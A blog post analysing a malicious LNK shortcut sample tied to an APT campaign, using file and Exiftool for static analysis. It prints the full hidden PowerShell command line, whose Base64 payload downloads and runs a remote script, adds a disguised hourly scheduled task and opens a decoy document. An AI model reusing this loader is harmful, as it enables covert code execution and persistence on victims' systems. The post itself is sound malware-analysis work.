---
layout: post
title: Analysing a malicious LNK-File
categories: Malware
date: 2025-05-20
---

# Introduction

A few weeks ago I stumbled upon a [report](https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html) from Trend Micro about an APT Campaign exploiting a Zero-Day using malicious LNK Files. So I searched for corresponding samples and found one at MalwareBazaar. So let's dive in and see what we can find out.

# Sample

- SHA256: 9b33b3b849fa8911bd7493bc0539f9fedc6ee0caf08374e4ac74f58f4ba5de4d

- [Source](https://bazaar.abuse.ch/sample/9b33b3b849fa8911bd7493bc0539f9fedc6ee0caf08374e4ac74f58f4ba5de4d/)

- [VirusTotal](https://www.virustotal.com/gui/file/9b33b3b849fa8911bd7493bc0539f9fedc6ee0caf08374e4ac74f58f4ba5de4d): (36/63)

# Analysis

Let's start out with some standard procedures when analysis an unknown, potentially malicous file.

For my static analysis in this case we will use a [Remnux](https://remnux.org/) VM. I will probably do another post about my general malware lab setup.

**What is it?**

First we'll use *file* to ensure that we are really dealing with a LNK file.

![lnk-file](/assets/img/file9blnk.png)

We directly identify the *MS Windows shortcut*. Another very interesting finding is the *Has command line argument* flag together with *window=hidenormalshowminimalized* which should already ring some alarm bells and shows something odd is going on here. 

Also the c/m/a timestamps look weird because they show the year 1601 - which is porribly not correct, isn't it? 

**Can we get some more?**

So as we are still trying to avoid handling the file on a windows machine we can use good old *Exiftool* to gather some more Info about our file. 

![exfiltool](/assets/img/exfiltool.png)

As you can see, *Exiftool* does not only work good with pictures or media file. We can also get a lot of information out of our LNK file here.

Again, our timestamps are misleading as they clearly show the dates of my own interaction with the file. What is more interesting here is the modified time in the *Description* field, which shows that the file was probably last modified on **10/20/2023 11:23.**

But of course, of most interest here are the *Command Line Arguments, which I will show you now.* 




```text
/c powershell -windowstyle hidden -nop -NoProfile -NonInteractive  -c "vnsonafoncoaefwe =\"JGZpbGVQYXRoID0gSm9pbi1QYXRoIChbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpKSAiXHN3b2xmLWZpcnN0LnBzMSI7DQokc3RyID0gJ0ludm9rZS1FeHByZXNzaW9uIC1Db21tYW5kICgoSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xanRSRDd1akZwNVl6VVRITko0ZldMVUhhcUxrN2MtcnkiIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQpJzsNCiRzdHIgfCBPdXQtRmlsZSAtRmlsZVBhdGggJGZpbGVQYXRoIC1FbmNvZGluZyBVVEY4DQokYWN0aW9uID0gTmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24gLUV4ZWN1dGUgJ1Bvd2VyU2hlbGwuZXhlJyAtQXJndW1lbnQgJy1XaW5kb3dTdHlsZSBIaWRkZW4gLW5vcCAgLU5vbkludGVyYWN0aXZlIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiYgeyRmaWxlUGF0aCA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKSkgIlxzd29sZi1maXJzdC5wczEiOyBJbnZva2UtRXhwcmVzc2lvbiAkZmlsZVBhdGg7fSInOw0KJHRyaWdnZXIgPSBOZXctU2NoZWR1bGVkVGFza1RyaWdnZXIgLU9uY2UgLUF0IChHZXQtRGF0ZSkuQWRkTWludXRlcygxKSAtUmVwZXRpdGlvbkludGVydmFsIChOZXctVGltZVNwYW4gLU1pbnV0ZXMgNjApOw0KJHNldHRpbmdzID0gTmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldCAtSGlkZGVuOw0KUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgIk1pY3Jvc29mdEVkZ2VVcGRhdGVWZXJzaW9uIiAtQWN0aW9uICRhY3Rpb24gLVRyaWdnZXIgJHRyaWdnZXIgLURlc2NyaXB0aW9uICJNaXJvc29mdCBFZGdlIFVwZGF0ZSIgLVNldHRpbmdzICRzZXR0aW5nczsNCiRmaWxlUGF0aCA9IEpvaW4tUGF0aCAoW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKSkgIlwyMDI064WEIOyDiO2VtCwg64Ko67aB66+4IDPqta0g7KCV7IOB7JeQ6rKMIOuTnOumrOuKlCDrqZTsi5zsp4AucnRmIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZD0xWGFqSC1vSFRGWVBwaHE5NFNVc3N6T1BKRzBjYWpJM2QiIC1vICIkZmlsZVBhdGgiOyANClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRmaWxlUGF0aDs=\";
bvoasnoncoecaew = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(vnsonafoncoaefwe));pvjpsadpocepncae = [System.IO.Path]::GetTempPath();vncbibciwscACd = \"zcnodcnewf\"+(Get-Random) + '.ps1';nvbiabsiudmnacose = Join-Path pvjpsadpocepncae vncbibciwscACd;bvoasnoncoecaew | Out-File -FilePath nvbiabsiudmnacose;&$nvbiabsiudmnacose"
```

Whoopsy! Let's breal this down a little bit. 

**Phase 1:**

```text
vnsonafoncoaefwe = "<BASE64_STRING>"
bvoasnoncoecaew =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(vnsonafoncoaefwe));
```

- The variable *vnsonafoncoaefwe*holds a **Base64-encoded script**.

- It gets decoded and stored in *voasnoncoecaew*.

**Phase 2:**

```text
pvjpsadpocepncae = [System.IO.Path]::GetTempPath();
vncbibciwscACd = "zcnodcnewf" + (Get-Random) + '.ps1';
nvbiabsiudmnacose = Join-Path pvjpsadpocepncae vncbibciwscACd;
bvoasnoncoecaew | Out-File -FilePath nvbiabsiudmnacose;
```

- The script get's stored under a random filename in the users temporary directory (e.g. C:\Users\User\AppData\Local\Temp)

Phase 3: 

```text
&$nvbiabsiudmnacose
```

- Executes the malicious script

**Malicious Powershell Script:**

So what does our malicious script do? I'll break it down:

1. Downloads hxxps[://]drive[.]google[.]com/uc?export=download&id=1jtRD7ujFp5YzUTHNJ4fWLUHaqLk7c-ry and saves it as swolf-first.ps1 in users temporary directory (e.g. C:\Users\User\AppData\Local\Temp\)

2. Executes swolf-first.ps1 with *Invoke-Expression*

3. Creates a new Sheduled Task named "MicrosoftEdgeUpdateVersion" that executes swolf-first.ps1 every 60 minutes

4. Downloads hxxps[://]drive[.]google[.]com/uc?export=download&id=1XajH-oHTFYPphq94SUsszOPJG0cajI3d and saves ist as 2024년 새해, 남북미 3국 정상에게 드리는 메시지.rtf in users temporary directory and opens it.

# Conclusions

As I am a little busy at the moment I didn't do dynamic analysis in a windows environment. But the most important insight to me is that you can simply use Exiftool for analysing malicious LNK-files. It gives you plenty of Metadata, in some cases even the machine name the files were written on. 






